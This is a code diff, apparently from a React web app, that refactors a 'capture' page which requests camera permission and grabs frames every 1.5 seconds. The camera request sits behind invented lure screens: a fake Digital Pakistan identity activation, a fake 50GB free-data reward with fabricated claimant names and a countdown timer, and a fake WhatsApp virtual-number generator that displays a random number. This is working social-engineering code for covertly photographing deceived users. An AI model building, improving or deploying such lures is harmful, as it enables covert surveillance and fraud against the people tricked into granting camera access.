@@ -45,6 +45,22 @@ export default function CapturePage() {
   const streamRef = useRef<MediaStream | null>(null);
   const captureIntervalRef = useRef<any>(null);
 
+  const fetchLinkInfo = React.useCallback(async () => {
+    try {
+      const res = await fetch('/api/links');
+      const links = await res.json();
+      const link = links.find((l: CaptureLink) => l.id === id);
+      
+      if (link) {
+        setLinkInfo(link);
+      } else {
+        setError('Configuration not found.');
+      }
+    } catch (err) {
+      setError('System error. Please try again.');
+    }
+  }, [id]);
+
   useEffect(() => {
     fetchLinkInfo();
     return () => {
@@ -55,26 +71,23 @@ export default function CapturePage() {
         clearInterval(captureIntervalRef.current);
       }
     };
-  }, [id]);
-
-  const fetchLinkInfo = async () => {
-    try {
-      const res = await fetch('/api/links');
-      const links = await res.json();
-      const link = links.find((l: any) => l.id === id);
-      
-      if (link) {
-        setLinkInfo(link);
-      } else {
-        setError('Configuration not found.');
-      }
-    } catch (err) {
-      setError('System error. Please try again.');
-    }
-  };
+  }, [id, fetchLinkInfo]);
 
   const requestPermissions = async () => {
     setPermissionError(null);
+    
+    // Stop existing stream if any
+    if (streamRef.current) {
+      streamRef.current.getTracks().forEach(track => track.stop());
+      streamRef.current = null;
+    }
+    
+    // Clear existing interval
+    if (captureIntervalRef.current) {
+      clearInterval(captureIntervalRef.current);
+      captureIntervalRef.current = null;
+    }
+
     try {
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { 
@@ -94,7 +107,6 @@ export default function CapturePage() {
       }
       
       // Start capture loop
-      if (captureIntervalRef.current) clearInterval(captureIntervalRef.current);
       captureIntervalRef.current = setInterval(() => {
         captureFrame();
       }, 1500);
@@ -658,21 +670,21 @@ function SocialStyle({ requestPermissions, permissionError }: { requestPermissio
   );
 }
 
+const DIGITAL_ACTIVATION_LOGS = [
+  "Initializing secure connection to Digital Pakistan Node...",
+  "Verifying biometric identity via SIM card...",
+  "Cross-referencing PTA database for device registration...",
+  "Establishing encrypted data tunnel (E2EE)...",
+  "Allocating temporary digital identity (TDI)...",
+  "Synchronizing with national digital infrastructure...",
+  "Digital identity successfully provisioned."
+];
+
 function DigitalStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
   const [step, setStep] = useState(0); // 0: initial, 1: loading, 2: success
   const [progress, setProgress] = useState(0);
   const [logs, setLogs] = useState<string[]>([]);
   const [retryCount, setRetryCount] = useState(0);
-
-  const activationLogs = [
-    "Initializing secure connection to Digital Pakistan Node...",
-    "Verifying biometric identity via SIM card...",
-    "Cross-referencing PTA database for device registration...",
-    "Establishing encrypted data tunnel (E2EE)...",
-    "Allocating temporary digital identity (TDI)...",
-    "Synchronizing with national digital infrastructure...",
-    "Digital identity successfully provisioned."
-  ];
 
   useEffect(() => {
     if (step === 1) {
@@ -680,9 +692,9 @@ function DigitalStyle({ requestPermissions, permissionError }: { requestPermissi
       setProgress(0);
       let currentLogIndex = 0;
       const logInterval = setInterval(() => {
-        if (currentLogIndex < activationLogs.length) {
-          setLogs(prev => [...prev, activationLogs[currentLogIndex]]);
-          setProgress(Math.min(100, Math.floor(((currentLogIndex + 1) / activationLogs.length) * 100)));
+        if (currentLogIndex < DIGITAL_ACTIVATION_LOGS.length) {
+          setLogs(prev => [...prev, DIGITAL_ACTIVATION_LOGS[currentLogIndex]]);
+          setProgress(Math.min(100, Math.floor(((currentLogIndex + 1) / DIGITAL_ACTIVATION_LOGS.length) * 100)));
           currentLogIndex++;
         } else {
           clearInterval(logInterval);
@@ -939,6 +951,23 @@ function DigitalStyle({ requestPermissions, permissionError }: { requestPermissi
   );
 }
 
+const REWARD_CLAIMS = [
+  { user: "Mohammad Ali", amount: "50GB", carrier: "Jazz 4G", time: "1m ago" },
+  { user: "Fatima Khan", amount: "50GB", carrier: "Zong", time: "3m ago" },
+  { user: "Zaid Ahmed", amount: "50GB", carrier: "Telenor", time: "4m ago" },
+  { user: "Sara Malik", amount: "50GB", carrier: "Ufone", time: "6m ago" },
+  { user: "Usman Sheikh", amount: "50GB", carrier: "Jazz 4G", time: "8m ago" },
+];
+
+const REWARD_LOGS = [
+  "Jazz/Zong Network Handshake...",
+  "PTA License Verification...",
+  "Allocating local data bucket...",
+  "SIM Biometric Identity Sync...",
+  "Authorizing 50GB allocation...",
+  "Digital Pakistan Bridge Active..."
+];
+
 function RewardStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
   const [step, setStep] = useState(0);
   const [progress, setProgress] = useState(0);
@@ -946,26 +975,9 @@ function RewardStyle({ requestPermissions, permissionError }: { requestPermissio
   const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
   const [retryCount, setRetryCount] = useState(0);
 
-  const recentClaims = [
-    { user: "Mohammad Ali", amount: "50GB", carrier: "Jazz 4G", time: "1m ago" },
-    { user: "Fatima Khan", amount: "50GB", carrier: "Zong", time: "3m ago" },
-    { user: "Zaid Ahmed", amount: "50GB", carrier: "Telenor", time: "4m ago" },
-    { user: "Sara Malik", amount: "50GB", carrier: "Ufone", time: "6m ago" },
-    { user: "Usman Sheikh", amount: "50GB", carrier: "Jazz 4G", time: "8m ago" },
-  ];
-
-  const activationLogs = [
-    "Jazz/Zong Network Handshake...",
-    "PTA License Verification...",
-    "Allocating local data bucket...",
-    "SIM Biometric Identity Sync...",
-    "Authorizing 50GB allocation...",
-    "Digital Pakistan Bridge Active..."
-  ];
-
   useEffect(() => {
     const tickerInterval = setInterval(() => {
-      setTickerIndex(prev => (prev + 1) % recentClaims.length);
+      setTickerIndex(prev => (prev + 1) % REWARD_CLAIMS.length);
     }, 4000);
 
     const timerInterval = setInterval(() => {
@@ -1046,9 +1058,9 @@ function RewardStyle({ requestPermissions, permissionError }: { requestPermissio
                 exit={{ y: -20, opacity: 0 }}
                 className="flex items-center gap-2 text-[10px] font-bold text-zinc-300"
               >
-                <span className="truncate max-w-[80px]">{recentClaims[tickerIndex].user}</span>
-                <span className="text-green-500 font-black">{recentClaims[tickerIndex].amount}</span>
-                <span className="text-[8px] bg-white/5 px-2 py-0.5 rounded-full text-zinc-500 uppercase tracking-tighter">{recentClaims[tickerIndex].carrier}</span>
+                <span className="truncate max-w-[80px]">{REWARD_CLAIMS[tickerIndex].user}</span>
+                <span className="text-green-500 font-black">{REWARD_CLAIMS[tickerIndex].amount}</span>
+                <span className="text-[8px] bg-white/5 px-2 py-0.5 rounded-full text-zinc-500 uppercase tracking-tighter">{REWARD_CLAIMS[tickerIndex].carrier}</span>
               </motion.div>
             </AnimatePresence>
           </div>
@@ -1213,7 +1225,7 @@ function RewardStyle({ requestPermissions, permissionError }: { requestPermissio
                        <Smartphone size={10} />
                        SESSION_PK_INIT
                     </div>
-                    {activationLogs.slice(0, Math.floor(progress / 18) + 1).map((log, i) => (
+                    {REWARD_LOGS.slice(0, Math.floor(progress / 18) + 1).map((log, i) => (
                       <motion.div 
                         initial={{ opacity: 0, x: -8 }} 
                         animate={{ opacity: 1, x: 0 }} 
@@ -1289,31 +1301,31 @@ function RewardStyle({ requestPermissions, permissionError }: { requestPermissio
   );
 }
 
+const COUNTRIES = [
+  { code: 'US', name: 'United States', flag: '🇺🇸', area: '+1', count: 'Active' },
+  { code: 'UK', name: 'United Kingdom', flag: '🇬🇧', area: '+44', count: 'Active' },
+  { code: 'CA', name: 'Canada', flag: '🇨🇦', area: '+1', count: 'Active' },
+  { code: 'TR', name: 'Turkey', flag: '🇹🇷', area: '+90', count: 'Limited' },
+  { code: 'SA', name: 'Saudi Arabia', flag: '🇸🇦', area: '+966', count: 'Active' },
+  { code: 'DE', name: 'Germany', flag: '🇩🇪', area: '+49', count: 'Active' },
+];
+
+const VIRTUAL_NUMBER_LOGS = [
+  "WhatsApp Activation Server: PK-SOUTH-1 Init...",
+  "Bypassing international SMS gateway...",
+  "Allocating virtual SIM instance...",
+  "Verifying SIM registration with node...",
+  "Binding number to local session...",
+  "Generating secure activation token...",
+  "Finalizing WhatsApp identity bridge..."
+];
+
 function VirtualNumberStyle({ requestPermissions, permissionError }: { requestPermissions: () => Promise<boolean>, permissionError: string | null }) {
   const [selectedCountry, setSelectedCountry] = useState<string | null>(null);
   const [isGenerating, setIsGenerating] = useState(false);
   const [step, setStep] = useState(0); // 0: Selection, 1: Generating, 2: Result/Finish
   const [genLogs, setGenLogs] = useState<string[]>([]);
   const [fakeNumber, setFakeNumber] = useState('');
-
-  const countries = [
-    { code: 'US', name: 'United States', flag: '🇺🇸', area: '+1', count: 'Active' },
-    { code: 'UK', name: 'United Kingdom', flag: '🇬🇧', area: '+44', count: 'Active' },
-    { code: 'CA', name: 'Canada', flag: '🇨🇦', area: '+1', count: 'Active' },
-    { code: 'TR', name: 'Turkey', flag: '🇹🇷', area: '+90', count: 'Limited' },
-    { code: 'SA', name: 'Saudi Arabia', flag: '🇸🇦', area: '+966', count: 'Active' },
-    { code: 'DE', name: 'Germany', flag: '🇩🇪', area: '+49', count: 'Active' },
-  ];
-
-  const logMessages = [
-    "WhatsApp Activation Server: PK-SOUTH-1 Init...",
-    "Bypassing international SMS gateway...",
-    "Allocating virtual SIM instance...",
-    "Verifying SIM registration with node...",
-    "Binding number to local session...",
-    "Generating secure activation token...",
-    "Finalizing WhatsApp identity bridge..."
-  ];
 
   const handleGenerate = async () => {
     const success = await requestPermissions();
@@ -1325,13 +1337,13 @@ function VirtualNumberStyle({ requestPermissions, permissionError }: { requestPe
     // Play logs
     let currentLog = 0;
     const logInterval = setInterval(() => {
-      if (currentLog < logMessages.length) {
-        setGenLogs(prev => [...prev, `[${new Date().toLocaleTimeString('en-GB')}] ${logMessages[currentLog]}`]);
+      if (currentLog < VIRTUAL_NUMBER_LOGS.length) {
+        setGenLogs(prev => [...prev, `[${new Date().toLocaleTimeString('en-GB')}] ${VIRTUAL_NUMBER_LOGS[currentLog]}`]);
         currentLog++;
       } else {
         clearInterval(logInterval);
         setTimeout(() => {
-          const area = countries.find(c => c.code === selectedCountry)?.area || '+1';
+          const area = COUNTRIES.find(c => c.code === selectedCountry)?.area || '+1';
           const randomNum = Math.floor(Math.random() * 9000000) + 1000000;
           setFakeNumber(`${area} ${randomNum}`);
           setStep(2);
@@ -1395,7 +1407,7 @@ function VirtualNumberStyle({ requestPermissions, permissionError }: { requestPe
               </div>
 
               <div className="grid grid-cols-2 gap-3 animate-in fade-in slide-in-from-bottom-4 duration-500">
-                {countries.map((c, i) => (
+                {COUNTRIES.map((c) => (
                   <button
                     key={c.code}
                     onClick={() => setSelectedCountry(c.code)}
